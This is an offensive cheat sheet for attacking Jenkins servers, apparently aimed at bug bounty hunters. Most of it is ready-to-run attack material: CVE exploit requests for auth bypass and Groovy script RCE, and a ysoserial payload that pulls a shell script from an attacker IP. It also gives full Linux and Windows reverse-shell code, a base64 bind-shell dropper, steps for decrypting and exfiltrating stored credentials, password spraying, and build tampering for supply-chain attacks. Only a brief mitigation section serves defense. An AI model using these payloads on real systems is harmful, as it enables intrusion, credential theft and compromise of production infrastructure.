## 1. Overview

Jenkins is an open-source automation server commonly used for CI/CD pipelines. From a security perspective, Jenkins instances are high-value targets because they often contain:

- **Credentials & API keys** stored in build configs
- **Access to internal networks** and production systems
- **Code execution capabilities** through build processes
- **Sensitive project data** in build logs and workspaces

### Detection

**Primary indicator:** Check HTTP response headers for `X-Jenkins`

```bash
curl -I https://target.com | grep -i jenkins
```

**Version fingerprinting:**

- Header: `X-Jenkins: 2.x.x` (version sometimes exposed)
- Visit: `/oops` or `/error` pages may leak version
- Check: `/login` page footer or source code

---

## 2. Exploitation Methods

### 2.1 Default Credentials

**Quick check:**

```
Username: admin
Password: admin
```

**Common weak credentials to test:**

- admin/password
- jenkins/jenkins
- admin/jenkins

### 2.2 Unauthenticated Access

**Test if dashboard is publicly accessible:**

```bash
# Check if no login required
curl -s https://target.com/jenkins/ | grep -i "New Item"

# Try accessing user page
curl -s https://target.com/securityRealm/user/admin/
```

**If accessible:** You have full read access and potentially job creation rights.

---

### 2.3 CVE-2018-1000861 (Authentication/ACL Bypass)

**Affects:** Jenkins < 2.150.1

**Vulnerability:** Dynamic routing bypass allows unauthenticated access

**Quick test:**

```bash
curl -k -s https://target.com/securityRealm/user/admin/search/index?q=a
```

**If you get valid JSON/data back** → Vulnerable! You've bypassed auth.

**References:**

- [Orange Tsai's Blog](https://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html)

---

### 2.4 CVE-2015-8103 (Deserialization RCE)

**Affects:** Jenkins ≤ 1.638

**Requirements:** Unauthenticated access to Jenkins CLI

**Exploitation steps:**

1. **Generate payload with ysoserial:**

```bash
java -jar ysoserial.jar CommonsCollections1 'wget http://YOUR_IP/shell.sh -O /tmp/shell.sh' > payload.out
```

2. **Send payload:**

```bash
python jenkins_rce.py TARGET_IP TARGET_PORT payload.out
```

**Tools needed:**

- [ysoserial](https://github.com/frohoff/ysoserial)
- [jenkins_rce.py](https://github.com/gquere/pwn_jenkins/blob/master/rce/jenkins_rce_cve-2015-8103_deser.py)

---

### 2.5 CVE-2019-1003000/1003001/1003002 (Metaprogramming RCE)

**Affects:** Multiple Jenkins plugins with script security issues

**Requirements:** Overall/Read + Job/Configure permissions

**Exploitation:**

- [Full exploit by petercunha](https://github.com/petercunha/jenkins-rce)
- [Alternative by adamyordan](https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc)

**Reference:** [Orange Tsai's Metaprogramming Research](https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html)

---

### 2.6 CVE-2019-1003029/1003030 (CheckScript RCE)

**Affects:** Script Security Plugin

**Requirements:** Overall/Read permissions

**Step 1 - Test if vulnerable:**

```bash
curl -k -X POST "https://target.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" \
  -d "sandbox=True" \
  -d 'value=class abcd{abcd(){sleep(5000)}}'
```

**If response is delayed by 5 seconds** → Vulnerable!

**Step 2 - Execute commands:**

```bash
curl -k -X POST "https://target.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" \
  -d "sandbox=True" \
  -d 'value=class abcd{abcd(){"wget http://YOUR_IP/callback".execute()}}'
```

**Step 3 - Debug with output:**

```bash
curl -k -X POST "https://target.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" \
  -d "sandbox=True" \
  -d 'value=class abcd{abcd(){def proc="id".execute();def os=new StringBuffer();proc.waitForProcessOutput(os, System.err);throw new Exception(os.toString())}}'
```

**Alternative GET method with URL encoding:**

```http
GET /securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=%70%75%62%6c%69%63%20%63%6c%61%73%73%20%78%20%7b%0a%20%20%70%75%62%6c%69%63%20%78%28%29%7b%0a%22%70%69%6e%67%20%2d%63%20%31%20%59%4f%55%52%5f%49%50%22%2e%65%78%65%63%75%74%65%28%29%0a%7d%0a%7d HTTP/1.1
```

---

### 2.7 CVE-2019-10392 (Git Plugin RCE)

**Affects:** Git plugin < 3.12.0

**Requirements:** Job/Configure permissions

**Note:** Very specific - requires user to have configure rights in security matrix.

---

### 2.8 Groovy Script Console RCE

**Access:** `/script` endpoint (requires admin/script execution rights)

**Verify access:**

```bash
curl -s https://target.com/jenkins/script | grep -i "Groovy script"
```

**If accessible** → You have RCE!

---

## 3. Post-Exploitation Techniques

### 3.1 Decrypt Jenkins Secrets (Live)

**From Script Console (`/script`):**

```groovy
println(hudson.util.Secret.decrypt("{ENCRYPTED_SECRET_HERE}"))
```

### 3.2 Command Execution via Groovy

**Simple command:**

```groovy
def proc = "id".execute();
def os = new StringBuffer();
proc.waitForProcessOutput(os, System.err);
println(os.toString());
```

**Windows command:**

```groovy
def process = "cmd /c whoami".execute();
println "${process.text}";
```

**Multi-line shell commands (with bind shell example):**

```groovy
def proc="sh -c \$@|sh . echo /bin/echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAzgAAAAAAAAAkAQAAAAAAAAAQAAAAAAAAailYmWoCX2oBXg8FSJdSxwQkAgD96UiJ5moQWmoxWA8FajJYDwVIMfZqK1gPBUiXagNeSP/OaiFYDwV19mo7WJlIuy9iaW4vc2gAU0iJ51JXSInmDwU= | base64 -d > /tmp/65001".execute();
```

### 3.3 Reverse Shell via Groovy

**Linux reverse shell:**

```groovy
String host="YOUR_IP";
int port=4444;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
  while(pi.available()>0)so.write(pi.read());
  while(pe.available()>0)so.write(pe.read());
  while(si.available()>0)po.write(si.read());
  so.flush();po.flush();
  Thread.sleep(50);
  try {p.exitValue();break;}catch (Exception e){}
};
p.destroy();s.close();
```

**Windows reverse shell:**

```groovy
String host="YOUR_IP";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
  while(pi.available()>0)so.write(pi.read());
  while(pe.available()>0)so.write(pe.read());
  while(si.available()>0)po.write(si.read());
  so.flush();po.flush();
  Thread.sleep(50);
  try {p.exitValue();break;}catch (Exception e){}
};
p.destroy();s.close();
```

**Upgrade to full PTY (Linux):**

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z to background
stty raw -echo; fg
export TERM=xterm-256color
stty rows 40 columns 160  # Adjust to your terminal size
```

---

## 4. Data Extraction

### 4.1 Dump Build Logs & Secrets

**Manual checks:**

- Visit: `/job/PROJECT_NAME/lastBuild/console`
- Check: Build environment variables
- Search for: API keys, passwords, tokens in logs

**Automated dumping:**

Use [jenkins_dump_builds.py](https://github.com/gquere/pwn_jenkins/blob/master/dump_builds/jenkins_dump_builds.py):

```bash
python jenkins_dump_builds.py -u USERNAME -p PASSWORD -o output_dir https://target.com
```

**Options:**

- `-l` = Only dump last build of each job
- `-r` = Recover from failures, skip existing
- `-v` = Verbose mode

### 4.2 Offline Secret Decryption

**Files to exfiltrate:**

1. `secrets/master.key`
2. `secrets/hudson.util.Secret`
3. `credentials.xml`
4. `jobs/*/build.xml`

**Find encrypted secrets:**

```bash
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<" /path/to/jenkins/
```

**Decrypt offline:**

Use [jenkins_offline_decrypt.py](https://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py):

```bash
# Method 1
python jenkins_offline_decrypt.py /jenkins/base/path/

# Method 2
python jenkins_offline_decrypt.py master.key hudson.util.Secret credentials.xml

# Method 3 (interactive)
python jenkins_offline_decrypt.py -i /jenkins/path/
```

---

## 5. Higher Impact Scenarios

### 🎯 Scenario 1: Jenkins → Internal Network Pivot

**Why it matters:** Jenkins often has access to internal networks, databases, and APIs that are otherwise unreachable.

**Actions:**

1. Use Groovy script to scan internal ranges
2. Exfiltrate cloud metadata (AWS IMDSv1/v2)
3. Access internal services via Jenkins as proxy

### 🎯 Scenario 2: Supply Chain Attack via Build Tampering

**Why it matters:** Modify builds to inject backdoors into production code.

**Actions:**

1. Modify build scripts in jobs
2. Inject malicious dependencies
3. Compromise CI/CD pipeline integrity

### 🎯 Scenario 3: Credential Harvesting for Lateral Movement

**Why it matters:** Jenkins stores credentials for Git, AWS, Docker registries, databases, etc.

**Actions:**

1. Dump all credentials using script console
2. Use credentials to access other systems
3. Escalate from CI/CD to production infrastructure

### 🎯 Scenario 4: Source Code Exfiltration

**Why it matters:** Access to private repositories and proprietary code.

**Actions:**

1. Clone all repositories Jenkins has access to
2. Download build artifacts
3. Extract intellectual property

---

## 6. Automation & Tools

### Essential Tools

**pwn_jenkins suite:**

- [Main repo](https://github.com/gquere/pwn_jenkins)
- dump_builds.py
- offline_decryption.py
- password_spraying.py
- jenkins_rce.py

**Jenkins Attack Framework:**

- [Accenture's framework](https://github.com/Accenture/jenkins-attack-framework)

**Payload generators:**

- [ysoserial](https://github.com/frohoff/ysoserial) - Java deserialization payloads

### Password Spraying

```bash
python jenkins_password_spraying.py -u users.txt -p passwords.txt https://target.com
```

---

## 7. Mitigation & Defense

### For Defenders

**✅ Security hardening:**

- Enable authentication (never leave Jenkins public)
- Use matrix-based security with least privilege
- Enable CSRF protection
- Restrict script console to admins only
- Use Job DSL/Pipeline instead of freestyle jobs
- Regular security audits of installed plugins

**✅ Monitoring:**

- Log all script console executions
- Alert on credential access patterns
- Monitor for unusual build patterns
- Track plugin installations/updates

**✅ Patch management:**

- Keep Jenkins core updated
- Regularly update all plugins
- Remove unused plugins
- Subscribe to Jenkins security advisories

**✅ Secrets management:**

- Use external secret stores (Vault, AWS Secrets Manager)
- Rotate credentials regularly
- Never log credentials in build output
- Use credential binding carefully

---

## 8. Testing Checklist

### Quick Wins (15 min)

- [ ] Check for `X-Jenkins` header
- [ ] Test default credentials (admin/admin)
- [ ] Try accessing `/script` endpoint
- [ ] Test unauthenticated dashboard access
- [ ] Try CVE-2018-1000861 bypass

### Deep Dive (1-2 hours)

- [ ] Enumerate all jobs and builds
- [ ] Search build logs for secrets
- [ ] Test CVE-2019-1003030 (CheckScript)
- [ ] Attempt Groovy sandbox escapes
- [ ] Check for vulnerable plugins
- [ ] Test password spraying
- [ ] Enumerate users via `/securityRealm/`

### Post-Access

- [ ] Execute commands via script console
- [ ] Dump credentials.xml
- [ ] Exfiltrate master.key + hudson.util.Secret
- [ ] Clone accessible repositories
- [ ] Map internal network access
- [ ] Check for cloud metadata access
- [ ] Document all findings with screenshots

---

## URLs to Remember

```
/script                          # Groovy script console
/securityRealm/user/admin        # User enumeration
/job/PROJECT/lastBuild/console   # Build logs
/credentials/                    # Credentials store
/systemInfo                      # System information
/manage                          # Management interface
```

---

**Pro tip:** Always check multiple Jenkins instances in your scope - one vulnerable Jenkins can lead to full infrastructure compromise. Focus on credential extraction first, then pivot to other systems. Good hunting! 🎯